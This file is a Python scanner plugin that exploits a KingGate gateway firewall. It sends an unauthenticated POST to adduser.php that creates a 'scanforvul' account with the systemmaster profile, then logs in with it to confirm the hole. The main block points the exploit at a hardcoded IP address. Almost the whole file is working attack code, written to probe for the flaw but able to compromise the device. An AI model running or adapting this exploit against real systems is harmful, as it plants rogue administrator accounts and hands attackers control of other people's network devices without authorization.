#!/usr/bin/env python
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2010-0135128
import urlparse
def assign(service, arg):
    if service == "kinggate":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'src/system/adduser.php'
    code, head, res, errcode, _ = curl.curl2(url)
    pos1=head.find("PHPSESSID=")+10
    pos2=head.find(";",pos1)
    session_id=head[pos1:pos2]
    if 'systemmaster' in res:
        postdata = "name=scanforvul&password=123qwe123&repassword=123qwe123&enable=&profile=systemmaster¤tpage=1&command=add&data=%0D%0A%5B%0D%0A%7B%22name%22%3A%22scanforvul%22%2C%22password%22%3A%22123qwe123%22%2C%22repassword%22%3A%22123qwe123%22%2C%22enable%22%3A%22yes%22%2C%22profile%22%3A%22systemmaster%22%7D%0D%0A%5D%0D%0A&movename="
        code, head, res, errcode, _ = curl.curl2(url,post=postdata)
        url = arg + 'src/system/login.php'
        postdata = "session_id=%s&IG_user=scanforvul&IG_passwd=123qwe123&submit1="%session_id
        code, head, res, errcode, _ = curl.curl2(url,post=postdata)
        if code==302 and 'Location:' in head:
            security_hole("金山KingGate新版网关防火墙添加管理员:http://www.wooyun.org/bugs/wooyun-2010-0135128")

if __name__ == '__main__':
    from dummy import *
    audit(assign('kinggate', 'https://202.103.238.229/')[1])